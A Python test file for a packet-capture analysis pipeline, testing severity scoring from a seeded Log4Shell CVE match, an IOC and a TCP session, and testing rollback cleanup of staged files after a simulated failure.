def test_severity_scoring_composite(tmp_path, monkeypatch):
    """Compute overall severity score and factors breakdown from CVEs, IOCs, and anomaly metrics."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-score", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="score.pcap",
            storage_key="score.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="match_cve",
        )
        session.add(run)
        session.flush()

        # Add a critical CVE
        cve = PcapCveMatches(
            run_id=run_id,
            evidence_id=ev.id,
            cve_id="CVE-2021-44228",
            cvss_score=10.0,
            severity="critical",
            match_type="payload_signature",
            confidence="high",
            description="Log4Shell",
        )
        session.add(cve)

        # Add public un-allowlisted IOC
        ioc = PcapIocs(
            run_id=run_id,
            evidence_id=ev.id,
            ioc_type="ipv4",
            ioc_value="198.51.100.44",
            is_allowlisted=False,
        )
        session.add(ioc)

        # Add a session
        sess = TcpSessions(
            run_id=run_id,
            evidence_id=ev.id,
            src_ip="192.168.1.10",
            dst_ip="198.51.100.44",
            src_port=45000,
            dst_port=443,
            state="established",
            snaplen=65535,
            total_bytes=1000,
            reassembled_bytes=1000,
            first_seen=datetime.now(timezone.utc),
            last_seen=datetime.now(timezone.utc),
        )
        session.add(sess)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_score_severity(ev_id, run_id=run_id)
    assert res["status"] == "complete"
    assert res["overall_score"] >= 5.0

    with get_sync_session() as session:
        score = session.execute(
            select(PcapSeverityScores).where(PcapSeverityScores.run_id == run_id)
        ).scalar_one()
        assert float(score.cvss_base_max) == 10.0
        assert score.overall_severity in ("medium", "high", "critical")
        assert "cvss_base_max" in score.factors

        updated_run = session.execute(
            select(PcapAnalysisRuns).where(PcapAnalysisRuns.run_id == run_id)
        ).scalar_one()
        assert updated_run.status == "complete"
        assert updated_run.completed_at is not None


def test_resiliency_rollback_purges_staging(tmp_path, monkeypatch):
    """Pipeline failure triggers rollback handler which purges disk staging prefix and updates status."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    storage = get_storage_backend()

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-rollback", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="rollback.pcap",
            storage_key="rollback.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="extract_artifacts",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    # Create dummy staged file under prefix analysis-{run_id}
    staging_prefix = f"analysis-{run_id}"
    storage_key, _ = storage.save_artifact(staging_prefix, b"transient_evidence_content", "bin")
    staged_file = storage.root / storage_key
    assert staged_file.is_file()

    # Invoke rollback handler
    handle_chain_failure(None, Exception("Simulated fatal parser crash"), run_id=run_id, evidence_id=ev_id)

    # Staged file should be wiped
    assert not staged_file.exists()

    with get_sync_session() as session:
        updated_run = session.execute(
            select(PcapAnalysisRuns).where(PcapAnalysisRuns.run_id == run_id)
        ).scalar_one()
        assert updated_run.status == "rolled_back"
        assert updated_run.rollback_started_at is not None
        assert updated_run.rollback_completed_at is not None
        assert "Simulated fatal parser crash" in (updated_run.error_message or "")



